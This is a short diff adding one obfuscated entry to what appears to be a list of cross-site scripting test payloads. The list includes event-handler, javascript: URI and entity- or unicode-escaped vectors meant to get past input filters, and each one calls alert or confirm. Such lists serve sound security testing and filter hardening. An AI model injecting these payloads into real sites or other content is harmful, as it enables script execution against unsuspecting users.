@@ -8,6 +8,7 @@ ${alert`XSS`}
 '-(a=window.alert,http://a.call(this,"BOO"))-'
 -(a=window.alert,http://a.call(this,"BOO"))-
 "><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
+<a href=&#106avascript:'%5C\u0075003C'+svg/'+'onload%5C\u0075003Dalert%5C\u00750028)\\u003E'>
 #&lt;img/src/onerror=alert(1)&gt;
 1"Onxx=><Svg/Onload=alert(1)//
 <frameset><frame src="javascript:alert(origin)"></frameset>
